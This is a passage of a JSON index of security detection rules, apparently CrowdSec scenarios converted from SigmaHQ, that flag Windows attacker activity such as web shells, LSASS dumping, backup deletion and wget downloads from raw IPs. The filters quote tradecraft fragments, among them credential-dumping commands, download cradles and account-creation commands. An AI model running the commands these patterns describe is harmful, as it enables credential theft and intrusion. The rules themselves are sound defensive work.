evt.Parsed.CommandLine contains 'service' && evt.Parsed.CommandLine contains 'internal-run' && evt.Parsed.CommandLine contains 'tunnel-service.log') && not (evt.Parsed.Image endsWith '\\\\code-tunnel.exe' || evt.Parsed.Image endsWith '\\\\code.exe') || evt.Parsed.ParentCommandLine endsWith ' tunnel' && evt.Parsed.Image endsWith '\\\\cmd.exe' && evt.Parsed.CommandLine contains '/d /c ' && evt.Parsed.CommandLine contains '\\\\servers\\\\Stable-' && evt.Parsed.CommandLine contains 'code-server.cmd' && not (evt.Parsed.ParentImage endsWith '\\\\code-tunnel.exe' || evt.Parsed.ParentImage endsWith '\\\\code.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1071.001\n\n  label: \"Renamed Visual Studio Code Tunnel Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects renamed Visual Studio Code tunnel execution. Attackers can abuse this functionality to establish a C2 channel\n", "path": "scenarios/sigmahq/proc_creation_win_vscode_tunnel_renamed_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "dc39da7aea89d257600884d2f2ba335d7e6fd11d478c56e64cba8614588c8f7c"}, "0.2": {"digest": "933ec1786eb074011b289d86e6a9acd08a505a276053c122bef66a8505923491"}}}, "sigmahq/proc_creation_win_w32tm": {"content": "type: trigger\nname: sigmahq/proc_creation_win_w32tm\ndescription: |\n  When configured with suitable command line arguments, w32tm can act as a delay mechanism\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\w32tm.exe' || evt.Parsed.OriginalFileName == 'w32time.dll') && evt.Parsed.CommandLine contains '/stripchart' && evt.Parsed.CommandLine contains '/computer:' && evt.Parsed.CommandLine contains '/period:' && evt.Parsed.CommandLine contains '/dataonly' && evt.Parsed.CommandLine contains '/samples:')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1124\n\n  label: \"Use of W32tm as Timer\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "When configured with suitable command line arguments, w32tm can act as a delay mechanism\n", "path": "scenarios/sigmahq/proc_creation_win_w32tm.yml", "version": "0.2", "versions": {"0.1": {"digest": "fab7b0369eaa9cc49cfefd429e2a16aebe094dae3eb252038ba51d7690652a27"}, "0.2": {"digest": "1a4c008c7445b9ffdc75c2042bd6bfdfb44410467a083eac99c35c548e563422"}}}, "sigmahq/proc_creation_win_wab_execution_from_non_default_location": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wab_execution_from_non_default_location\ndescription: |\n  Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\wab.exe' || evt.Parsed.Image endsWith '\\\\wabmig.exe') && not (evt.Parsed.Image startsWith 'C:\\\\Windows\\\\WinSxS\\\\' || evt.Parsed.Image startsWith 'C:\\\\Program Files\\\\Windows Mail\\\\' || evt.Parsed.Image startsWith 'C:\\\\Program Files (x86)\\\\Windows Mail\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Wab Execution From Non Default Location\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity\n", "path": "scenarios/sigmahq/proc_creation_win_wab_execution_from_non_default_location.yml", "version": "0.2", "versions": {"0.1": {"digest": "0a53c742c3e67dac97e75bc176d61992217b4f0eff8c73825278356a4afbce82"}, "0.2": {"digest": "f41932a0a1f3a00b543a20ed49fa1626a48e58b9b6c212434f2d899b1f5e653d"}}}, "sigmahq/proc_creation_win_wab_unusual_parents": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wab_unusual_parents\ndescription: |\n  Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\WmiPrvSE.exe' || evt.Parsed.ParentImage endsWith '\\\\svchost.exe' || evt.Parsed.ParentImage endsWith '\\\\dllhost.exe') && (evt.Parsed.Image endsWith '\\\\wab.exe' || evt.Parsed.Image endsWith '\\\\wabmig.exe') || evt.Parsed.ParentImage endsWith '\\\\wab.exe' || evt.Parsed.ParentImage endsWith '\\\\wabmig.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Wab/Wabmig Unusual Parent Or Child Processes\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity\n", "path": "scenarios/sigmahq/proc_creation_win_wab_unusual_parents.yml", "version": "0.2", "versions": {"0.1": {"digest": "9936d7ebdd57e4b41af719dbe926a1e4428c2b29581b66b40c5a36787fab9110"}, "0.2": {"digest": "2e48eed30172343d2c94245dd5d685b338a08d61a5f92e8b21fc6f49c0d9194b"}}}, "sigmahq/proc_creation_win_wbadmin_delete_all_backups": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wbadmin_delete_all_backups\ndescription: |\n  Detects the deletion of all backups or system state backups via \"wbadmin.exe\". This technique is used by numerous ransomware families and actors. This may only be successful on server platforms that have Windows Backup enabled. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\wbadmin.exe' || evt.Parsed.OriginalFileName == 'WBADMIN.EXE') && evt.Parsed.CommandLine contains 'delete' && evt.Parsed.CommandLine contains 'backup' && evt.Parsed.CommandLine contains 'keepVersions:0')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1490\n\n  label: \"All Backups Deleted Via Wbadmin.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the deletion of all backups or system state backups via \"wbadmin.exe\". This technique is used by numerous ransomware families and actors. This may only be successful on server platforms that have Windows Backup enabled. \n", "path": "scenarios/sigmahq/proc_creation_win_wbadmin_delete_all_backups.yml", "version": "0.2", "versions": {"0.1": {"digest": "3a78b298b35ee1719eb8b64d8f6bdcfc7a61e9f5e52b5b69cdbc3b5b017a1bae"}, "0.2": {"digest": "3e9c98ec3aa1569cf37b075ef954d4b7b9d50c9542d9e797f742c8218db2b5b7"}}}, "sigmahq/proc_creation_win_webshell_chopper": {"content": "type: trigger\nname: sigmahq/proc_creation_win_webshell_chopper\ndescription: |\n  Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\w3wp.exe' || evt.Parsed.ParentImage endsWith '\\\\w3wp.exe') && (evt.Parsed.CommandLine contains '&ipconfig&echo' || evt.Parsed.CommandLine contains '&quser&echo' || evt.Parsed.CommandLine contains '&whoami&echo' || evt.Parsed.CommandLine contains '&c:&echo' || evt.Parsed.CommandLine contains '&cd&echo' || evt.Parsed.CommandLine contains '&dir&echo' || evt.Parsed.CommandLine contains '&echo [E]' || evt.Parsed.CommandLine contains '&echo [S]'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1505.003\n   - attack.t1018\n   - attack.t1033\n   - attack.t1087\n\n  label: \"Chopper Webshell Process Pattern\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells\n", "path": "scenarios/sigmahq/proc_creation_win_webshell_chopper.yml", "version": "0.2", "versions": {"0.1": {"digest": "ff5f26c98c6a62f1176061b6c2599e1d60659529ac3759847fd4506d864993ad"}, "0.2": {"digest": "7fc1928f868b53a391dc25d1eb873ff01086a4b43ad546f633819d155de076d8"}}}, "sigmahq/proc_creation_win_webshell_hacking": {"content": "type: trigger\nname: sigmahq/proc_creation_win_webshell_hacking\ndescription: |\n  Detects certain parent child patterns found in cases in which a web shell is used to perform certain credential dumping or exfiltration activities on a compromised system \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\caddy.exe' || evt.Parsed.ParentImage endsWith '\\\\httpd.exe' || evt.Parsed.ParentImage endsWith '\\\\nginx.exe' || evt.Parsed.ParentImage endsWith '\\\\php-cgi.exe' || evt.Parsed.ParentImage endsWith '\\\\w3wp.exe' || evt.Parsed.ParentImage endsWith '\\\\ws_tomcatservice.exe' || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.ParentImage contains '-tomcat-' || evt.Parsed.ParentImage contains '\\\\tomcat') || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.CommandLine contains 'catalina.jar' || evt.Parsed.CommandLine contains 'CATALINA_HOME')) && (evt.Parsed.CommandLine contains 'rundll32' && evt.Parsed.CommandLine contains 'comsvcs' || evt.Parsed.CommandLine contains ' -hp' && evt.Parsed.CommandLine contains ' a ' && evt.Parsed.CommandLine contains ' -m' || evt.Parsed.CommandLine contains 'net' && evt.Parsed.CommandLine contains ' user ' && evt.Parsed.CommandLine contains ' /add' || evt.Parsed.CommandLine contains 'net' && evt.Parsed.CommandLine contains ' localgroup ' && evt.Parsed.CommandLine contains ' administrators ' && evt.Parsed.CommandLine contains '/add' || evt.Parsed.Image endsWith '\\\\ntdsutil.exe' || evt.Parsed.Image endsWith '\\\\ldifde.exe' || evt.Parsed.Image endsWith '\\\\adfind.exe' || evt.Parsed.Image endsWith '\\\\procdump.exe' || evt.Parsed.Image endsWith '\\\\Nanodump.exe' || evt.Parsed.Image endsWith '\\\\vssadmin.exe' || evt.Parsed.Image endsWith '\\\\fsutil.exe' || evt.Parsed.CommandLine contains ' -decode ' || evt.Parsed.CommandLine contains ' -NoP ' || evt.Parsed.CommandLine contains ' -W Hidden ' || evt.Parsed.CommandLine contains ' /decode ' || evt.Parsed.CommandLine contains ' /ticket:' || evt.Parsed.CommandLine contains ' sekurlsa' || evt.Parsed.CommandLine contains '.dmp full' || evt.Parsed.CommandLine contains '.downloadfile(' || evt.Parsed.CommandLine contains '.downloadstring(' || evt.Parsed.CommandLine contains 'FromBase64String' || evt.Parsed.CommandLine contains 'process call create' || evt.Parsed.CommandLine contains 'reg save ' || evt.Parsed.CommandLine contains 'whoami /priv'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1505.003\n   - attack.t1018\n   - attack.t1033\n   - attack.t1087\n\n  label: \"Webshell Hacking Activity Patterns\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects certain parent child patterns found in cases in which a web shell is used to perform certain credential dumping or exfiltration activities on a compromised system \n", "path": "scenarios/sigmahq/proc_creation_win_webshell_hacking.yml", "version": "0.2", "versions": {"0.1": {"digest": "d6868578cdf362e704027225e63327c1fe5c25011690bde582b975ee0333f2dc"}, "0.2": {"digest": "49950672092d2b170054f5e4c1e612da1ecf0192de99715d2a038a9859255ab4"}}}, "sigmahq/proc_creation_win_webshell_recon_commands_and_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_webshell_recon_commands_and_processes\ndescription: |\n  Detects certain command line parameters often used during reconnaissance activity via web shells\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\w3wp.exe' || evt.Parsed.ParentImage endsWith '\\\\php-cgi.exe' || evt.Parsed.ParentImage endsWith '\\\\nginx.exe' || evt.Parsed.ParentImage endsWith '\\\\httpd.exe' || evt.Parsed.ParentImage endsWith '\\\\caddy.exe' || evt.Parsed.ParentImage endsWith '\\\\ws_tomcatservice.exe' || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.ParentImage contains '-tomcat-' || evt.Parsed.ParentImage contains '\\\\tomcat') || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.CommandLine contains 'catalina.jar' || evt.Parsed.CommandLine contains 'CATALINA_HOME')) && ((evt.Parsed.OriginalFileName in ['net.exe', 'net1.exe']) && (evt.Parsed.CommandLine contains ' user ' || evt.Parsed.CommandLine contains ' use ' || evt.Parsed.CommandLine contains ' group ') || evt.Parsed.OriginalFileName == 'ping.exe' && evt.Parsed.CommandLine contains ' -n ' || evt.Parsed.CommandLine contains '&cd&echo' || evt.Parsed.CommandLine contains 'cd /d ' || evt.Parsed.OriginalFileName == 'wmic.exe' && evt.Parsed.CommandLine contains ' /node:' || evt.Parsed.Image endsWith '\\\\dsquery.exe' || evt.Parsed.Image endsWith '\\\\find.exe' || evt.Parsed.Image endsWith '\\\\findstr.exe' || evt.Parsed.Image endsWith '\\\\ipconfig.exe' || evt.Parsed.Image endsWith '\\\\netstat.exe' || evt.Parsed.Image endsWith '\\\\nslookup.exe' || evt.Parsed.Image endsWith '\\\\pathping.exe' || evt.Parsed.Image endsWith '\\\\quser.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\systeminfo.exe' || evt.Parsed.Image endsWith '\\\\tasklist.exe' || evt.Parsed.Image endsWith '\\\\tracert.exe' || evt.Parsed.Image endsWith '\\\\ver.exe' || evt.Parsed.Image endsWith '\\\\wevtutil.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe' || evt.Parsed.OriginalFileName in ['dsquery.exe', 'find.exe', 'findstr.exe', 'ipconfig.exe', 'netstat.exe', 'nslookup.exe', 'pathping.exe', 'quser.exe', 'schtasks.exe', 'sysinfo.exe', 'tasklist.exe', 'tracert.exe', 'ver.exe', 'VSSADMIN.EXE', 'wevtutil.exe', 'whoami.exe'] || evt.Parsed.CommandLine contains ' Test-NetConnection ' || evt.Parsed.CommandLine contains 'dir \\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1505.003\n   - attack.t1018\n   - attack.t1033\n   - attack.t1087\n\n  label: \"Webshell Detection With Command Line Keywords\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects certain command line parameters often used during reconnaissance activity via web shells\n", "path": "scenarios/sigmahq/proc_creation_win_webshell_recon_commands_and_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "eb837c9714269780a5464336926c6633b0364f8d10c3ce6017d67b53716d2a41"}, "0.2": {"digest": "6ae3b6fa7555b7d5d7533918712f66e71d70dfaded5c418e79126c2ed11c8189"}}}, "sigmahq/proc_creation_win_webshell_susp_process_spawned_from_webserver": {"content": "type: trigger\nname: sigmahq/proc_creation_win_webshell_susp_process_spawned_from_webserver\ndescription: |\n  Detects potentially suspicious processes being spawned by a web server process which could be the result of a successfully placed web shell or exploitation \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\caddy.exe' || evt.Parsed.ParentImage endsWith '\\\\httpd.exe' || evt.Parsed.ParentImage endsWith '\\\\nginx.exe' || evt.Parsed.ParentImage endsWith '\\\\php-cgi.exe' || evt.Parsed.ParentImage endsWith '\\\\php.exe' || evt.Parsed.ParentImage endsWith '\\\\tomcat.exe' || evt.Parsed.ParentImage endsWith '\\\\UMWorkerProcess.exe' || evt.Parsed.ParentImage endsWith '\\\\w3wp.exe' || evt.Parsed.ParentImage endsWith '\\\\ws_TomcatService.exe' || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.ParentImage contains '-tomcat-' || evt.Parsed.ParentImage contains '\\\\tomcat') || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.ParentCommandLine contains 'CATALINA_HOME' || evt.Parsed.ParentCommandLine contains 'catalina.home' || evt.Parsed.ParentCommandLine contains 'catalina.jar')) && (evt.Parsed.Image endsWith '\\\\arp.exe' || evt.Parsed.Image endsWith '\\\\at.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\dsget.exe' || evt.Parsed.Image endsWith '\\\\hostname.exe' || evt.Parsed.Image endsWith '\\\\nbtstat.exe' || evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.Image endsWith '\\\\netdom.exe' || evt.Parsed.Image endsWith '\\\\netsh.exe' || evt.Parsed.Image endsWith '\\\\nltest.exe' || evt.Parsed.Image endsWith '\\\\ntdutil.exe' || evt.Parsed.Image endsWith '\\\\powershell_ise.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\qprocess.exe' || evt.Parsed.Image endsWith '\\\\query.exe' || evt.Parsed.Image endsWith '\\\\qwinsta.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\sc.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\wusa.exe') && not (evt.Parsed.ParentImage endsWith '\\\\java.exe' && evt.Parsed.CommandLine endsWith 'Windows\\\\system32\\\\cmd.exe /c C:\\\\ManageEngine\\\\ADManager \"Plus\\\\ES\\\\bin\\\\elasticsearch.bat -Enode.name=RMP-NODE1 -pelasticsearch-pid.txt' || evt.Parsed.ParentImage endsWith '\\\\java.exe' && evt.Parsed.CommandLine contains 'sc query' && evt.Parsed.CommandLine contains 'ADManager Plus'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1505.003\n   - attack.t1190\n\n  label: \"Suspicious Process By Web Server Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potentially suspicious processes being spawned by a web server process which could be the result of a successfully placed web shell or exploitation \n", "path": "scenarios/sigmahq/proc_creation_win_webshell_susp_process_spawned_from_webserver.yml", "version": "0.2", "versions": {"0.1": {"digest": "393a2b09df03db50b7ef2de408a3cd4367e757cde2507a67bf5c54da33df1399"}, "0.2": {"digest": "f041e27e4eada6f90b325cc3ab570fb6dc03c41ece25e51de3e044916d5b44f2"}}}, "sigmahq/proc_creation_win_webshell_tool_recon": {"content": "type: trigger\nname: sigmahq/proc_creation_win_webshell_tool_recon\ndescription: |\n  Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\caddy.exe' || evt.Parsed.ParentImage endsWith '\\\\httpd.exe' || evt.Parsed.ParentImage endsWith '\\\\nginx.exe' || evt.Parsed.ParentImage endsWith '\\\\php-cgi.exe' || evt.Parsed.ParentImage endsWith '\\\\w3wp.exe' || evt.Parsed.ParentImage endsWith '\\\\ws_tomcatservice.exe' || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.ParentImage contains '-tomcat-' || evt.Parsed.ParentImage contains '\\\\tomcat') || (evt.Parsed.ParentImage endsWith '\\\\java.exe' || evt.Parsed.ParentImage endsWith '\\\\javaw.exe') && (evt.Parsed.CommandLine contains 'CATALINA_HOME' || evt.Parsed.CommandLine contains 'catalina.jar')) && (evt.Parsed.CommandLine contains 'perl --help' || evt.Parsed.CommandLine contains 'perl -h' || evt.Parsed.CommandLine contains 'python --help' || evt.Parsed.CommandLine contains 'python -h' || evt.Parsed.CommandLine contains 'python3 --help' || evt.Parsed.CommandLine contains 'python3 -h' || evt.Parsed.CommandLine contains 'wget --help'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1505.003\n\n  label: \"Webshell Tool Reconnaissance Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands \n", "path": "scenarios/sigmahq/proc_creation_win_webshell_tool_recon.yml", "version": "0.2", "versions": {"0.1": {"digest": "e77c548415dfc3377c8b62b5e83ba3e50d481970c181cbf5d806123c1ac02c17"}, "0.2": {"digest": "1b781e08e2f53757d40f4009df9c16ed78e9cbe346d2d7b04033f6d5e44c2f38"}}}, "sigmahq/proc_creation_win_werfault_lsass_shtinkering": {"content": "type: trigger\nname: sigmahq/proc_creation_win_werfault_lsass_shtinkering\ndescription: |\n  Detects potential credential dumping via Windows Error Reporting LSASS Shtinkering technique which uses the Windows Error Reporting to dump lsass\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\Werfault.exe' || evt.Parsed.OriginalFileName == 'WerFault.exe') && (evt.Parsed.ParentUser contains 'AUTHORI' || evt.Parsed.ParentUser contains 'AUTORI') && (evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI') && evt.Parsed.CommandLine contains ' -u -p ' && evt.Parsed.CommandLine contains ' -ip ' && evt.Parsed.CommandLine contains ' -s ' && not (evt.Parsed.ParentImage == 'C:\\\\Windows\\\\System32\\\\lsass.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"Potential Credential Dumping Via WER\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential credential dumping via Windows Error Reporting LSASS Shtinkering technique which uses the Windows Error Reporting to dump lsass\n", "path": "scenarios/sigmahq/proc_creation_win_werfault_lsass_shtinkering.yml", "version": "0.2", "versions": {"0.1": {"digest": "fbfd612f3427f3c8ccab279236df0b6c72e1c906f82672ce21081e59ea43a68b"}, "0.2": {"digest": "b3c60198cdfa59735065c0e7c8d4adf7d56b3458e2025151815ebd4762b0e610"}}}, "sigmahq/proc_creation_win_wermgr_susp_exec_location": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wermgr_susp_exec_location\ndescription: |\n  Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\wermgr.exe' && not (evt.Parsed.Image startsWith 'C:\\\\Windows\\\\System32\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\SysWOW64\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\WinSxS\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious Execution Location Of Wermgr.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.\n", "path": "scenarios/sigmahq/proc_creation_win_wermgr_susp_exec_location.yml", "version": "0.2", "versions": {"0.1": {"digest": "e36feda61fd571ce998c7fcb411eb4512d995606c6e12f6453c90fa912c2f9d9"}, "0.2": {"digest": "b3d2ae25caac135b818dee06f10409bb6f80b3548b9c0e7304fa76db40e98aa7"}}}, "sigmahq/proc_creation_win_wget_download_direct_ip": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wget_download_direct_ip\ndescription: |\n  Detects potentially suspicious file downloads directly from IP addresses using Wget.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\wget.exe' || evt.Parsed.OriginalFileName == 'wget.exe') && evt.Parsed.CommandLine matches '://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}' && evt.Parsed.CommandLine contains 'http' && (evt.Parsed.CommandLine matches '\\\\s-O\\\\s' || evt.Parsed.CommandLine contains '--output-document') && (evt.Parsed.CommandLine endsWith '.ps1' || evt.Parsed.CommandLine endsWith '.ps1\\'' || evt.Parsed.CommandLine endsWith '.ps1\"' || evt.Parsed.CommandLine endsWith '.dat' || evt.Parsed.CommandLine endsWith '.dat\\'' || evt.Parsed.CommandLine endsWith '.dat\"' || evt.Parsed.CommandLine endsWith '.msi' || evt.Parsed.CommandLine endsWith '.msi\\'' || evt.Parsed.CommandLine endsWith '.msi\"' || evt.Parsed.CommandLine endsWith '.bat' || evt.Parsed.CommandLine endsWith '.bat\\'' || evt.Parsed.CommandLine endsWith '.bat\"' || evt.Parsed.CommandLine endsWith '.exe' || evt.Parsed.CommandLine endsWith '.exe\\'' || evt.Parsed.CommandLine endsWith '.exe\"' || evt.Parsed.CommandLine endsWith '.vbs' || evt.Parsed.CommandLine endsWith '.vbs\\'' || evt.Parsed.CommandLine endsWith '.vbs\"' || evt.Parsed.CommandLine endsWith '.vbe' || evt.Parsed.CommandLine endsWith '.vbe\\'' || evt.Parsed.CommandLine endsWith '.vbe\"' || evt.Parsed.CommandLine endsWith '.hta' || evt.Parsed.CommandLine endsWith '.hta\\'' || evt.Parsed.CommandLine endsWith '.hta\"' || evt.Parsed.CommandLine endsWith '.dll' || evt.Parsed.CommandLine endsWith '.dll\\'' || evt.Parsed.CommandLine endsWith '.dll\"' || evt.Parsed.CommandLine endsWith '.psm1' || evt.Parsed.CommandLine endsWith '.psm1\\'' || evt.Parsed.CommandLine endsWith '.psm1\"'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious File Download From IP Via Wget.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potentially suspicious file downloads directly from IP addresses using Wget.exe\n", "path": "scenarios/sigmahq/proc_creation_win_wget_download_direct_ip.yml", "version": "0.2", "versions": {"0.1": {"digest": "e1293e03375e03ec148f85295fdde63c460d65c14d101e0f6043f7b0784bf5de"}, "0.2": {"digest": "7787f97b03734f8c907f27dd68e981408e63cc266046fc2ddebaadb8c943b77f"}}}, "sigmahq/proc_creation_win_whoami_execution_from_high_priv_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_whoami_execution_from_high_priv_process\ndescription: |\n  Detects the execution of \"whoami.exe\" by privileged accounts that are often abused by threat actors\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'whoami.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe') && (evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI' || evt.Parsed.User contains 'TrustedInstaller'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1033\n\n  label: \"Whoami.EXE Execution From Privileged Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of \"whoami.exe\" by privileged accounts that are often abused by threat actors\n", "path": "scenarios/sigmahq/proc_creation_win_whoami_execution_from_high_priv_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "7c7f3a5b4c6f8bb05726bcf2a991a956999eb24ed9ad584bfe29266816e92f83"}, "0.2": {"digest": "2e2bf6c7d74b94f139d7c57492ba479377548e5834e9790938f858aa274cb1de"}}}, "sigmahq/proc_creation_win_whoami_priv_discovery": {"content": "type: trigger\nname: sigmahq/proc_creation_win_whoami_priv_discovery\ndescription: |\n  Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privileges. This is often used after a privilege escalation 